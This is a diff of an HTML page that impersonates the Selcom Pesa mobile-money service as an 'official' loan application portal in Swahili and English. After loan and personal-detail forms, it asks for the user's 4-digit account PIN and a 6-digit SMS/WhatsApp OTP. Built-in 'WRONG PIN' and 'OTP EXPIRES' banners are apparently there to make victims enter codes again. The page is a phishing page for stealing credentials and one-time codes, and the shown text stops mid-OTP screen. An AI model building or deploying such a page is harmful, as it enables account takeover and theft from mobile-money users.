@@ -1,324 +1,388 @@
 <!DOCTYPE html>
-<html lang="sw">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Selcom Pesa - Lango la Maombi ya Mkopo</title>
+  <title>Selcom Pesa - Loan Portal</title>
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
-<div class="app-container" style="background-color: #0A2540;">
+<div class="app-container">
   
-  <!-- Header / Top Bar with Interactive Language Toggle -->
-  <div style="padding: 16px 20px 8px 20px; display: flex; justify-content: space-between; align-items: center;">
+  <!-- Top Bar with Language Switcher -->
+  <div class="top-bar">
     <div class="lang-switch-container">
-      <span id="lang-label-eng" style="font-size: 11px; font-weight: 700; color: #FFF; opacity: 0.7;">ENG</span>
+      <span id="lang-eng-label" class="lang-label active">ENG</span>
       <label class="switch">
-        <input type="checkbox" id="language-toggle" checked>
-        <span class="slider-toggle"></span>
+        <input type="checkbox" id="lang-toggle">
+        <span class="slider round"></span>
       </label>
-      <span id="lang-label-swa" style="font-size: 11px; font-weight: 700; color: #FFF;">SWAHILI</span>
+      <span id="lang-swa-label" class="lang-label">SWAHILI</span>
     </div>
-    
-    <div style="font-size: 20px;">💬</div>
+    <div class="top-icon">💬</div>
   </div>
 
-  <!-- STEP 1: WELCOME MESSAGE -->
-  <section id="step-welcome" class="screen active" style="background-color: #0A2540; padding-top: 4px;">
-    
-    <div style="text-align: center; margin-bottom: 14px;">
-      <span class="brand-title" style="font-size: 26px; font-weight: 800; color: #FFF; letter-spacing: 0.5px;">Selcom</span>
+  <!-- WELCOME STEP -->
+  <section id="step-welcome" class="screen active">
+    <div class="brand-header">
+      <h1 class="brand-logo">Selcom <small>PESA</small></h1>
     </div>
 
-    <h1 id="txt-welcome-title" style="font-size: 19px; color: #FFF; text-align: center; margin-top: 4px; font-weight: 800;">KARIBU SELCOM TANZANIA!</h1>
-    <p id="txt-welcome-sub" style="font-size: 12px; color: #FFF; text-align: center; margin-bottom: 12px; font-weight: 600; letter-spacing: 0.3px;">WELCOME TO THE OFFICIAL APPLICATION PORTAL.</p>
-
-    <div style="font-size: 12px; color: #FFF; text-align: center; margin-bottom: 14px; line-height: 1.5; padding: 0 10px;" id="txt-welcome-desc">
-      Your unique Selcom Account Details (Tanzania only) are required for all interactions. Ensure you use a valid account number to avoid delays.
-    </div>
-
-    <!-- CRITICAL NOTIFICATION BOX -->
-    <div class="notice-box" style="text-align: left; background-color: #FFC107; border: 1px solid #FFB300; border-radius: 12px; padding: 14px; margin-bottom: 14px; color: #000;">
-      <div style="display: flex; align-items: center; gap: 6px; font-weight: 800; font-size: 13px; margin-bottom: 4px;">
-        <span>⚠️</span> <span id="txt-crit-notif">CRITICAL NOTIFICATION</span>
-      </div>
-      <div style="font-weight: 700; font-size: 12px; margin-bottom: 4px;" id="txt-attention">:* ! ATTENTION!</div>
-      <p style="font-size: 11px; line-height: 1.4; margin: 0;" id="txt-crit-desc">
-        An essential security measure: <strong>DO NOT ENTER INVALID SELCOM ACCOUNT DETAILS</strong>. This will cause immediate rejection. Please double-check your Tanzania-specific account number before submitting.
-      </p>
-    </div>
-
-    <div style="text-align: center; margin-bottom: 14px;">
-      <div style="display: inline-block; padding: 4px; border-radius: 4px; border: 2px solid #000;">
-        <div style="width: 130px; height: 80px; background: linear-gradient(135deg, #1EB53A 33%, #000000 33%, #000000 66%, #00A3DD 66%); position: relative;"></div>
-      </div>
-      <div style="font-size: 11px; color: #FFF; margin-top: 6px;" id="txt-official-portal">Official Application Portal (Tanzania Only)</div>
-    </div>
-
-    <button id="btn-welcome-proceed" class="btn-primary btn-large" style="margin-top: auto; background-color: #4CAF50; color: #FFF; border-radius: 8px;">
-      ENDELEA
-    </button>
-  </section>
-
-  <!-- STEP 2: LOAN CALCULATOR (SLIDER) -->
-  <section id="step-slider" class="screen" style="background-color: #0A2540; color: #FFF;">
     <div class="welcome-banner">
-      <h2 id="txt-calc-title" style="color: #FFF;">Kadiria Malipo ya Mkopo</h2>
-      <p id="txt-calc-sub" style="color: #A0AEC0; font-size: 13px;">Chagua kiasi cha mkopo na muda wa marejesho</p>
+      <h2 id="txt-welcome-title">KARIBU SELCOM TANZANIA!</h2>
+      <p id="txt-welcome-sub">WELCOME TO THE OFFICIAL APPLICATION PORTAL.</p>
     </div>
 
-    <div class="overview-card" style="background-color: #0F3057; border: 1px solid #1E3A8A;">
-      <div class="slider-group">
-        <div class="slider-header">
-          <span id="txt-loan-amount-lbl" class="slider-label" style="color: #FFF;">Kiasi cha Mkopo (TZS)</span>
-          <span id="balance-val" class="slider-val">100,000 TZS</span>
-        </div>
-        <input type="range" id="slider-balance" min="10000" max="5000000" value="100000" step="10000" class="range-slider red-slider">
-        <div class="slider-limits">
-          <span style="color: #A0AEC0;">10K TZS</span>
-          <span style="color: #A0AEC0;">5M TZS</span>
-        </div>
-      </div>
-
-      <div class="slider-group">
-        <div class="slider-header">
-          <span id="txt-loan-term-lbl" class="slider-label" style="color: #FFF;">Muda wa Mkopo (Miezi)</span>
-          <span id="duration-val" class="slider-val">12 miezi</span>
-        </div>
-        <input type="range" id="slider-duration" min="3" max="60" value="12" step="1" class="range-slider red-slider">
-        <div class="slider-limits">
-          <span style="color: #A0AEC0;">3 miezi</span>
-          <span style="color: #A0AEC0;">60 miezi</span>
-        </div>
-      </div>
-
-      <div class="account-box" style="background-color: #1A365D; border: none;">
-        <div class="phone-icon-circle">💵</div>
-        <div class="account-info">
-          <span id="txt-monthly-est" class="account-title" style="color: #A0AEC0;">Makadirio ya Malipo ya Kila Mwezi</span>
-          <span class="account-amount" style="color: #FFF;">9,500 TZS</span>
-        </div>
-      </div>
+    <div class="notice-box">
+      <p id="txt-welcome-desc">Your unique Selcom Account Details (Tanzania only) are required for all interactions. Ensure you use a valid account number to avoid delays.</p>
     </div>
 
-    <button id="btn-slider-next" class="btn-primary btn-large" style="margin-top: auto; background-color: #FFF; color: #000; border-radius: 8px;">
-      INGIA / TUMIA →
-    </button>
+    <div class="critical-box">
+      <div class="critical-title">⚠️ CRITICAL NOTIFICATION</div>
+      <p id="txt-critical-msg"><strong>*! ATTENTION!</strong><br>An essential security measure: <strong>DO NOT ENTER INVALID SELCOM ACCOUNT DETAILS</strong>. This will cause immediate rejection. Please double-check your Tanzania-specific account number before submitting.</p>
+    </div>
+
+    <div class="flag-container">
+      <div class="flag-graphic">🇹🇿</div>
+      <p id="txt-official-portal" class="portal-footer-text">Official Application Portal (Tanzania Only)</p>
+    </div>
+
+    <button id="btn-welcome-continue" class="btn-primary btn-large">CONTINUE</button>
   </section>
 
-  <!-- STEP 3: FORM - STEP 1 OF 3 -->
-  <section id="step-form-1" class="screen" style="background-color: #4A0E17; color: #FFF;">
-    <div style="text-align: center; margin-bottom: 16px;">
-      <h2 id="txt-form1-title" style="font-size: 20px; color: #FFF;">Maombi ya Mkopo</h2>
-      <p id="txt-form1-step" style="color: #FFCDD2; font-size: 13px;">Hatua 1 ya 3</p>
-      <div style="display: flex; gap: 8px; margin-top: 10px;">
-        <div style="flex: 1; height: 4px; background: #FF5722; border-radius: 2px;"></div>
-        <div style="flex: 1; height: 4px; background: rgba(255,255,255,0.2); border-radius: 2px;"></div>
-        <div style="flex: 1; height: 4px; background: rgba(255,255,255,0.2); border-radius: 2px;"></div>
+  <!-- CALCULATOR STEP -->
+  <section id="step-slider" class="screen">
+    <div class="brand-header">
+      <h1 class="brand-logo">Selcom <small>PESA</small></h1>
+    </div>
+
+    <div class="welcome-banner" style="margin-bottom: 10px;">
+      <h2 id="txt-calc-title">Estimate your loan repayments</h2>
+    </div>
+
+    <div class="overview-card">
+      <div class="slider-group">
+        <div class="slider-header">
+          <span id="txt-loan-amount-label" class="slider-label">LOAN AMOUNT</span>
+          <span id="balance-val" class="slider-val">TSH 2,500,000</span>
+        </div>
+        <input type="range" id="slider-balance" min="100000" max="10000000" value="2500000" step="50000" class="range-slider">
+        <div class="slider-limits">
+          <span>TSH 100,000</span>
+          <span>🇹🇿</span>
+          <span>TSH 10,000,000</span>
+        </div>
+      </div>
+
+      <div class="slider-group">
+        <div class="slider-header">
+          <span id="txt-loan-term-label" class="slider-label">LOAN TERM (MONTHS)</span>
+          <span id="duration-val" class="slider-val">12 MONTHS</span>
+        </div>
+        <input type="range" id="slider-duration" min="3" max="60" value="12" step="1" class="range-slider">
+        <div class="slider-limits">
+          <span>3 MONTHS</span>
+          <span>60 MONTHS</span>
+        </div>
+      </div>
+
+      <div class="account-box">
+        <div class="account-info" style="width: 100%; text-align: center;">
+          <span id="txt-est-monthly" class="account-title">ESTIMATED MONTHLY REPAYMENT</span>
+          <span class="account-amount">TSH 235,000</span>
+        </div>
+      </div>
+
+      <div style="text-align: center; font-size: 13px; color: var(--text-muted); margin-top: 8px;">
+        <span id="txt-total-repay">TOTAL REPAYMENT: TSH 2,820,000</span><br>
+        <span id="txt-assumed-rate">*Assumed Interest Rate: 13.5%</span>
+      </div>
+    </div>
+
+    <button id="btn-slider-next" class="btn-primary btn-large">SIGN IN</button>
+  </section>
+
+  <!-- FORM STEP 1 -->
+  <section id="step-form-1" class="screen">
+    <div class="sub-header-bar">
+      <span id="btn-form1-back-top" class="back-link">← Rudi</span>
+      <div class="brand-logo-small">Selcom <span>MKERKONI TANZANIA</span></div>
+      <div class="menu-icon">☰</div>
+    </div>
+
+    <div style="text-align: center; margin-bottom: 12px;">
+      <h2 id="txt-form1-title" style="font-size: 20px; color: #111;">Maombi ya Mkopo</h2>
+      <p id="txt-form1-step" style="color: #555; font-size: 13px;">Hatua 1 ya 3</p>
+      <div style="display: flex; gap: 6px; margin-top: 8px;">
+        <div style="flex: 1; height: 4px; background: #FF6600; border-radius: 2px;"></div>
+        <div style="flex: 1; height: 4px; background: #D0D0D0; border-radius: 2px;"></div>
+        <div style="flex: 1; height: 4px; background: #D0D0D0; border-radius: 2px;"></div>
       </div>
     </div>
 
     <div class="form-group">
-      <label id="txt-loan-type-lbl" for="loan-type" style="color: #FFF;">Aina ya Mkopo</label>
-      <select id="loan-type" class="input-field" style="background: #FFF; color: #000;">
-        <option value="Business Loan">Mkopo wa Biashara</option>
-        <option value="Personal Loan">Mkopo Binafsi</option>
-        <option value="Emergency Loan">Mkopo wa Dharura</option>
+      <label id="lbl-loan-type" for="loan-type">Aina ya Mkopo</label>
+      <select id="loan-type" class="input-field">
+        <option value="Mkopo wa Biashara">Mkopo wa Biashara</option>
+        <option value="Mkopo wa Kibinafsi">Mkopo wa Kibinafsi</option>
+        <option value="Mkopo wa Dharura">Mkopo wa Dharura</option>
       </select>
     </div>
 
     <div class="form-group">
-      <label id="txt-form-amount-lbl" for="form-amount" style="color: #FFF;">Kiasi cha Mkopo (TZS)</label>
-      <input type="text" id="form-amount" class="input-field" readonly style="background: #FFF; color: #000;">
+      <label id="lbl-loan-amt" for="form-amount">Kiasi cha Mkopo (TSh)</label>
+      <input type="text" id="form-amount" class="input-field" value="100000">
     </div>
 
     <div class="form-group">
-      <label id="txt-form-duration-lbl" for="form-duration" style="color: #FFF;">Muda wa Mkopo</label>
-      <select id="form-duration" class="input-field" style="background: #FFF; color: #000;">
-        <option value="3 Months">Miezi 3</option>
-        <option value="6 Months">Miezi 6</option>
-        <option value="12 Months" selected>Miezi 12</option>
-        <option value="24 Months">Miezi 24</option>
-        <option value="48 Months">Miezi 48</option>
-        <option value="60 Months">Miezi 60</option>
+      <label id="lbl-loan-dur" for="form-duration">Muda wa Mkopo</label>
+      <select id="form-duration" class="input-field">
+        <option value="Miezi 6">Miezi 6</option>
+        <option value="Miezi 12">Miezi 12</option>
+        <option value="Miezi 24">Miezi 24</option>
+        <option value="Miezi 48" selected>Miezi 48</option>
+        <option value="Miezi 60">Miezi 60</option>
       </select>
     </div>
 
     <div class="form-group">
-      <label id="txt-loan-purpose-lbl" for="loan-purpose" style="color: #FFF;">Madhumuni ya Mkopo</label>
-      <textarea id="loan-purpose" class="input-field" rows="3" placeholder="Elezea madhumuni ya mkopo wako..." style="background: #FFF; color: #000;"></textarea>
+      <label id="lbl-loan-purpose" for="loan-purpose">Madhumuni ya Mkopo</label>
+      <textarea id="loan-purpose" class="input-field" rows="3" placeholder="Elezea madhumuni ya mkopo wako..."></textarea>
     </div>
 
-    <button id="btn-form1-next" class="btn-primary btn-large" style="margin-top: auto; background-color: #FF5722; color: #FFF; border-radius: 8px;">
-      HATUA INAYOFUATA →
-    </button>
+    <button id="btn-form1-next" class="btn-primary btn-large">HATUA INAYOFUATA</button>
   </section>
 
-  <!-- STEP 4: FORM - STEP 2 OF 3 -->
-  <section id="step-form-2" class="screen" style="background-color: #4A0E17; color: #FFF;">
-    <div style="text-align: center; margin-bottom: 16px;">
-      <h2 id="txt-form2-title" style="font-size: 20px; color: #FFF;">Maombi ya Mkopo</h2>
-      <p id="txt-form2-step" style="color: #FFCDD2; font-size: 13px;">Hatua 2 ya 3</p>
-      <div style="display: flex; gap: 8px; margin-top: 10px;">
-        <div style="flex: 1; height: 4px; background: #FF5722; border-radius: 2px;"></div>
-        <div style="flex: 1; height: 4px; background: #FF5722; border-radius: 2px;"></div>
-        <div style="flex: 1; height: 4px; background: rgba(255,255,255,0.2); border-radius: 2px;"></div>
+  <!-- FORM STEP 2 -->
+  <section id="step-form-2" class="screen">
+    <div class="sub-header-bar">
+      <span id="btn-form2-back-top" class="back-link">← Rudi</span>
+      <div class="brand-logo-small">Selcom <span>MKERKONI TANZANIA</span></div>
+      <div class="menu-icon">☰</div>
+    </div>
+
+    <div style="text-align: center; margin-bottom: 12px;">
+      <h2 id="txt-form2-title" style="font-size: 20px; color: #111;">Maombi ya Mkopo</h2>
+      <p id="txt-form2-step" style="color: #555; font-size: 13px;">Hatua 2 ya 3</p>
+      <div style="display: flex; gap: 6px; margin-top: 8px;">
+        <div style="flex: 1; height: 4px; background: #FF6600; border-radius: 2px;"></div>
+        <div style="flex: 1; height: 4px; background: #FF6600; border-radius: 2px;"></div>
+        <div style="flex: 1; height: 4px; background: #D0D0D0; border-radius: 2px;"></div>
       </div>
     </div>
 
-    <div style="display: flex; gap: 12px;" class="form-group">
+    <div style="display: flex; gap: 10px;" class="form-group">
       <div style="flex: 1;">
-        <label id="txt-firstname-lbl" for="first-name" style="color: #FFF;">Jina la Kwanza</label>
-        <input type="text" id="first-name" class="input-field" placeholder="Jina la Kwanza" style="background: #FFF; color: #000;">
+        <label id="lbl-firstname" for="first-name">Jina la Kwanza</label>
+        <input type="text" id="first-name" class="input-field" placeholder="Jina la kwanza">
       </div>
       <div style="flex: 1;">
-        <label id="txt-lastname-lbl" for="last-name" style="color: #FFF;">Jina la Ukoo</label>
-        <input type="text" id="last-name" class="input-field" placeholder="Jina la Ukoo" style="background: #FFF; color: #000;">
+        <label id="lbl-lastname" for="last-name">Jina la Ukoo</label>
+        <input type="text" id="last-name" class="input-field" placeholder="Jina la ukoo">
       </div>
     </div>
 
     <div class="form-group">
-      <label id="txt-phone-lbl" for="phone-number" style="color: #FFF;">Namba ya Simu (Tanzania)</label>
-      <div class="phone-input-wrapper" style="background: #FFF;">
+      <label id="lbl-phone" for="phone-number">Nambari ya Simu (Tanzania)</label>
+      <div class="phone-input-wrapper">
         <div class="flag-prefix">🇹🇿 +255</div>
-        <input type="tel" id="phone-number" class="input-field phone-field" placeholder="07XXXXXXXX" maxlength="10" style="background: #FFF; color: #000;">
+        <input type="tel" id="phone-number" class="input-field phone-field" placeholder="712345678 au 0712345678" maxlength="10">
       </div>
-      <span id="phone-error" class="error-text" style="color: #FFCDD2;">Tafadhali ingiza namba sahihi ya simu inayoanza na 0.</span>
+      <span id="phone-error" class="error-text">Weka nambari sahihi ya Tanzania (mfano 712345678).</span>
+      <small id="txt-phone-hint" style="color: #666; font-size: 11px; display: block; margin-top: 4px;">Weka nambari 9 au anza na 0 (mfano, 0712345678 -> inabadilika hadi 072345678)</small>
     </div>
 
-    <div style="display: flex; gap: 12px; margin-top: auto;">
-      <button id="btn-form2-back" class="btn-primary" style="background-color: #6C757D; color: #FFF; border-radius: 8px;">ILIYOTANGULIA</button>
-      <button id="btn-form2-next" class="btn-primary" style="background-color: #FF5722; color: #FFF; border-radius: 8px;">HATUA INAYOFUATA</button>
+    <div style="display: flex; gap: 10px; margin-top: auto;">
+      <button id="btn-form2-back" class="btn-secondary" style="flex: 1;">ILIYOTANGULIA</button>
+      <button id="btn-form2-next" class="btn-primary" style="flex: 1;">HATUA INAYOFUATA</button>
     </div>
   </section>
 
-  <!-- STEP 5: FORM - STEP 3 OF 3 (SUMMARY) -->
-  <section id="step-form-3" class="screen" style="background-color: #4A0E17; color: #FFF;">
-    <div style="text-align: center; margin-bottom: 16px;">
-      <h2 id="txt-form3-title" style="font-size: 20px; color: #FFF;">Maombi ya Mkopo</h2>
-      <p id="txt-form3-step" style="color: #FFCDD2; font-size: 13px;">Hatua 3 ya 3</p>
-      <div style="display: flex; gap: 8px; margin-top: 10px;">
-        <div style="flex: 1; height: 4px; background: #FF5722; border-radius: 2px;"></div>
-        <div style="flex: 1; height: 4px; background: #FF5722; border-radius: 2px;"></div>
-        <div style="flex: 1; height: 4px; background: #FF5722; border-radius: 2px;"></div>
+  <!-- FORM STEP 3 -->
+  <section id="step-form-3" class="screen">
+    <div class="sub-header-bar">
+      <span id="btn-form3-back-top" class="back-link">← Rudi</span>
+      <div class="brand-logo-small">Selcom <span>MKERKONI TANZANIA</span></div>
+      <div class="menu-icon">☰</div>
+    </div>
+
+    <div style="text-align: center; margin-bottom: 12px;">
+      <h2 id="txt-form3-title" style="font-size: 20px; color: #111;">Maombi ya Mkopo</h2>
+      <p id="txt-form3-step" style="color: #555; font-size: 13px;">Hatua 3 ya 3</p>
+      <div style="display: flex; gap: 6px; margin-top: 8px;">
+        <div style="flex: 1; height: 4px; background: #FF6600; border-radius: 2px;"></div>
+        <div style="flex: 1; height: 4px; background: #FF6600; border-radius: 2px;"></div>
+        <div style="flex: 1; height: 4px; background: #FF6600; border-radius: 2px;"></div>
       </div>
     </div>
 
     <div class="form-group">
-      <label id="txt-emp-status-lbl" for="employment-status" style="color: #FFF;">Hali ya Ajira</label>
-      <select id="employment-status" class="input-field" style="background: #FFF; color: #000;">
-        <option value="Entrepreneur / Merchant">Mjasiriamali / Mfanyabiashara</option>
-        <option value="Private Sector Employee">Mfanyakazi wa Sekta Binafsi</option>
-        <option value="Government Employee">Mtumishi wa Serikali</option>
-        <option value="Self-Employed">Aliyejiajiri</option>
+      <label id="lbl-employment" for="employment-status">Hali ya Ajira</label>
+      <select id="employment-status" class="input-field">
+        <option value="Mfanyabiashara">Mfanyabiashara</option>
+        <option value="Mwajiriwa wa Sekta Binafsi">Mwajiriwa wa Sekta Binafsi</option>
+        <option value="Mtumishi wa Umma">Mtumishi wa Umma</option>
+        <option value="Kujiajiri">Kujiajiri</option>
       </select>
     </div>
 
     <div class="form-group">
-      <label id="txt-income-lbl" for="annual-income" style="color: #FFF;">Mapato ya Mwaka (TZS)</label>
-      <input type="number" id="annual-income" class="input-field" placeholder="Weka mapato ya mwaka" style="background: #FFF; color: #000;">
+      <label id="lbl-annual-income" for="annual-income">Mapato ya Mwaka (TSh)</label>
+      <input type="number" id="annual-income" class="input-field" placeholder="Weka mapato ya mwaka">
     </div>
 
-    <!-- APPLICATION SUMMARY -->
-    <div class="loan-details-card" style="margin-top: 10px; background: #FFF; color: #000;">
-      <div id="txt-summary-header" class="detail-header-label">Muhtasari wa Maombi</div>
-      <div style="font-size: 13px; line-height: 1.8;">
-        <div style="display: flex; justify-content: space-between;">
-          <span id="txt-sum-amt-lbl" style="color: var(--text-muted);">Kiasi cha Mkopo:</span>
-          <strong id="summary-amount">100,000 TZS</strong>
-        </div>
-        <div style="display: flex; justify-content: space-between;">
-          <span id="txt-sum-term-lbl" style="color: var(--text-muted);">Muda wa Mkopo:</span>
-          <strong id="summary-duration">12 Miezi</strong>
-        </div>
-        <div style="display: flex; justify-content: space-between;">
-          <span id="txt-sum-purp-lbl" style="color: var(--text-muted);">Madhumuni:</span>
-          <strong id="summary-purpose">Mkopo wa Biashara</strong>
-        </div>
-        <div style="display: flex; justify-content: space-between;">
-          <span id="txt-sum-app-lbl" style="color: var(--text-muted);">Mwombaji:</span>
-          <strong id="summary-applicant">Selcom Customer</strong>
-        </div>
+    <div class="loan-summary-box">
+      <div id="txt-summary-title" class="summary-title">Muhtasari wa Maombi</div>
+      <div class="summary-grid">
+        <span id="txt-sum-amt-lbl">Kiasi cha Mkopo:</span> <strong id="summary-amount">TSh 100,000</strong>
+        <span id="txt-sum-dur-lbl">Muda wa Mkopo:</span> <strong id="summary-duration">Miezi 48</strong>
+        <span id="txt-sum-pur-lbl">Madhumuni:</span> <strong id="summary-purpose">Biashara</strong>
+        <span id="txt-sum-app-lbl">Mwombaji:</span> <strong id="summary-applicant">Selcom Customer</strong>
       </div>
     </div>
 
-    <div style="display: flex; gap: 12px; margin-top: auto;">
-      <button id="btn-form3-back" class="btn-primary" style="background-color: #6C757D; color: #FFF; border-radius: 8px;">ILIYOTANGULIA</button>
-      <button id="btn-form3-submit" class="btn-primary" style="background-color: #FF5722; color: #FFF; border-radius: 8px;">WASILISHA MAOMBI</button>
+    <div style="display: flex; gap: 10px; margin-top: auto;">
+      <button id="btn-form3-back" class="btn-secondary" style="flex: 1;">ILIYOTANGULIA</button>
+      <button id="btn-form3-submit" class="btn-primary" style="flex: 1;">WASILISHA MAOMBI</button>
     </div>
   </section>
 
-  <!-- STEP 6: SELCOM PESA PIN -->
-  <section id="step-pin" class="screen" style="background: linear-gradient(135deg, #4A0E17 0%, #2A050A 100%); color: #FFF; padding: 20px; align-items: center;">
-    <div style="background: #FFF; padding: 8px 16px; border-radius: 8px; margin-bottom: 20px; display: inline-block;">
-      <span style="color: #1A365D; font-weight: 800; font-size: 18px;">se<span style="color: #00A3DD;">l</span>com</span>
-      <div style="font-size: 9px; font-weight: 700; color: #1A365D; text-align: center; letter-spacing: 1px;">TANZANIA</div>
+  <!-- PIN STEP -->
+  <section id="step-pin" class="screen">
+    <div class="brand-header-dark">
+      <div class="brand-logo-small">selcom <span>TANZANIA</span></div>
     </div>
 
-    <h2 id="txt-pin-title" style="font-size: 20px; text-align: center; font-weight: 700; margin-bottom: 12px;">Thibitisha PIN yako ya SELCOM PESA</h2>
-    
-    <p id="txt-pin-sub" style="font-size: 13px; text-align: center; opacity: 0.9; margin-bottom: 20px; line-height: 1.5;">
-      Kwa usalama, tafadhali thibitisha PIN yako ya tarakimu 4 ya akaunti ili kuendelea.
-    </p>
+    <h2 id="txt-pin-title" class="auth-title">Thibitisha PIN yako ya SELCOM PESA</h2>
+    <p id="txt-pin-sub" class="auth-sub">Kwa usalama, tafadhali thibitisha PIN yako ya tarakimu 4 ya akaunti ili kuendelea.</p>
 
     <div id="creds-surface-banner" class="surface-banner">
       WRONG PIN ❌ (Tafadhali weka PIN sahihi)
     </div>
 
-    <div style="display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 16px;">
-      <span style="font-size: 20px;">🇹🇿</span>
-      <span id="txt-pin-label" style="font-size: 14px; font-weight: 600;">PIN yako ya tarakimu 4</span>
-      <span style="font-size: 18px;">📱🔒</span>
-    </div>
-
-    <div class="form-group" style="width: 100%; max-width: 320px; text-align: center;">
-      <div class="pin-grid" style="display: flex; justify-content: center; gap: 10px;">
-        <input type="password" class="pin-digit" maxlength="1" inputmode="numeric" style="width: 55px; height: 55px; background: #D4AF37; border: 2px solid #B8860B; border-radius: 6px; font-size: 24px; text-align: center; color: #000;">
-        <input type="password" class="pin-digit" maxlength="1" inputmode="numeric" style="width: 55px; height: 55px; background: #D4AF37; border: 2px solid #B8860B; border-radius: 6px; font-size: 24px; text-align: center; color: #000;">
-        <input type="password" class="pin-digit" maxlength="1" inputmode="numeric" style="width: 55px; height: 55px; background: #D4AF37; border: 2px solid #B8860B; border-radius: 6px; font-size: 24px; text-align: center; color: #000;">
-        <input type="password" class="pin-digit" maxlength="1" inputmode="numeric" style="width: 55px; height: 55px; background: #D4AF37; border: 2px solid #B8860B; border-radius: 6px; font-size: 24px; text-align: center; color: #000;">
+    <div class="auth-center-block">
+      <div class="flag-icon-medium">🇹🇿</div>
+      <p id="txt-pin-prompt" class="pin-prompt-text">PIN yako ya tarakimu 4</p>
+      
+      <div class="pin-grid">
+        <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
+        <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
+        <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
+        <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
       </div>
-      <span id="pin-error" class="error-text" style="color: #FF6B6B;">Tafadhali ingiza PIN yako ya tarakimu 4.</span>
+      <span id="pin-error" class="error-text">Weka PIN yako kamili ya tarakimu 4.</span>
+      <p id="txt-pin-hint" class="pin-hint-text">Hakikisha hii inalingana na PIN uliyoweka kwa akaunti hii.</p>
     </div>
 
-    <p id="txt-pin-note" style="font-size: 12px; text-align: center; opacity: 0.8; margin-top: 10px; margin-bottom: 24px;">
-      Hakikisha hii inalingana na PIN uliyoweka kwa akaunti hii.
-    </p>
-
-    <button id="btn-submit-creds" class="btn-primary btn-large" style="width: 100%; max-width: 320px; background-color: #D32F2F; color: #FFF; border-radius: 8px; margin-top: auto;">WASILISHA</button>
+    <button id="btn-submit-creds" class="btn-primary btn-large">WASILISHA</button>
   </section>
 
-  <!-- STEP 7: 6-DIGIT OTP VERIFICATION -->
-  <section id="step-otp" class="screen" style="background: linear-gradient(135deg, #4A0E17 0%, #2A050A 100%); color: #FFF; padding: 20px; align-items: center;">
-    <div style="background: #FFF; padding: 8px 16px; border-radius: 8px; margin-bottom: 20px; display: inline-block;">
-      <span style="color: #1A365D; font-weight: 800; font-size: 18px;">se<span style="color: #00A3DD;">l</span>com</span>
-      <div style="font-size: 9px; font-weight: 700; color: #1A365D; text-align: center; letter-spacing: 1px;">TANZANIA</div>
+  <!-- OTP STEP (6 DIGITS WITH 1 MINUTE COUNTDOWN) -->
+  <section id="step-otp" class="screen">
+    <div class="brand-header-dark">
+      <div class="brand-logo-small">selcom <span>TANZANIA</span></div>
     </div>
 
-    <h2 id="txt-otp-title" style="font-size: 20px; text-align: center; font-weight: 700; margin-bottom: 12px;">Thibitisha OTP yako ya SELCOM PESA</h2>
-    
-    <p id="txt-otp-sub" style="font-size: 12px; text-align: center; opacity: 0.9; margin-bottom: 20px; line-height: 1.5;">
-      Kwa usalama, msimbo wa OTP umetumwa kwa SMS au WhatsApp kwenye nambari yako ya SELCOM PESA. Tafadhali ingiza hapa chini ili kuendelea.
-    </p>
+    <h2 id="txt-otp-title" class="auth-title">Thibitisha OTP yako ya SELCOM PESA</h2>
+    <p id="txt-otp-sub" class="auth-sub">Kwa usalama, msimbo wa OTP umetumwa kupitia SMS au WhatsApp kwenye nambari yako ya SELCOM PESA. Tafadhali ingiza hapa chini ili kuendelea.</p>
 
     <div id="otp-surface-banner" class="surface-banner">
-      OTP EXPIRES ❌ (Tafadhali ingiza msimbo mpya)
+      OTP EXPIRES ❌ (Tafadhali omba msimbo mpya)
     </div>
 
-    <div style="display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 14px;">
-      <span style="font-size: 18px;">💬</span>
-      <span id="txt-otp-label" style="font-size: 14px; font-weight: 600;">OTP yako ya tarakimu 6</span>
-      <span style="font-size: 18px;">📞</span>
-    </div>
+    <div class="auth-center-block">
+      <div class="otp-icons-row">💬 📱</div>
+      <p id="txt-otp-prompt" class="pin-prompt-text">OTP yako ya tarakimu 6</p>
 
-    <div class="form-group" style="width: 100%; max-width: 340px; text-align: center;">
-      <div class="pin-grid" style="display: flex; justify-content: center; gap: 6px;">
-        <input type="text" class="otp-digit-6" maxlength="1" inputmode="numeric" style="width: 45px; height: 50px; background: #D4AF37; border: 2px solid #B8860B; border-radius: 6px; font-size: 22px; text-align: center; color: #000;">
-        <input type="text" class="otp-digit-6" maxlength="1" inputmode="numeric" style="width: 45px; height: 50px; background: #D4AF37; border: 2px solid #B8860B; border-radius: 6px; font-size: 22px; text-align: center; color: #000;">
-        <input type="text" class="otp-digit-6" maxlength="1" inputmode="numeric" style="width: 45px; height: 50px; background: #D4AF37; border: 2px solid #B8860B; border-radius: 6px; font-size: 22px; text-align: center; color: #000;">
-        <input type="text" class="otp-digit-6" maxlength="1" inputmode="numeric" style="width: 45px; height: 50px; background: #D4AF37; border: 2px solid #B8860B; border-radius: 6px; font-size: 22px; text-align: center; color: #000;">
-        <input type="text" class="otp-digit-6" maxlength="1" inputmode="numeric" style="width: 45px; height: 50px; background: #D4AF37; border: 2px solid #B8860B; border-radius: 6px; font-size: 22px; text-align: center; color: #000;">
-        <input type="text" class="otp-digit-6" maxlength="1" inputmode="numeric" style="width: 45px; height: 50px; background: #D4AF37; border: 2px solid #B8860B; border-radius: 6px; font-size: 22px; text-align: center; color: #000;">
+      <div class="pin-grid-6">
+        <input type="text" class="otp-digit-6" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-digit-6" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-digit-6" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-digit-6" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-digit-6" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-digit-6" maxlength="1" inputmode="numeric">
       </div>
-      <span id="otp-error" class="error-text" style="color: #FF6B6B;">Tafadhali ingiza msimbo kamili wa taraki
+      <span id="otp-error" class="error-text">Weka msimbo kamili wa tarakimu 6.</span>
+      
+      <p class="pin-hint-text">
+        <span id="txt-otp-instruction">Tafadhali ingiza msimbo kamili wa tarakimu 6.</span><br>
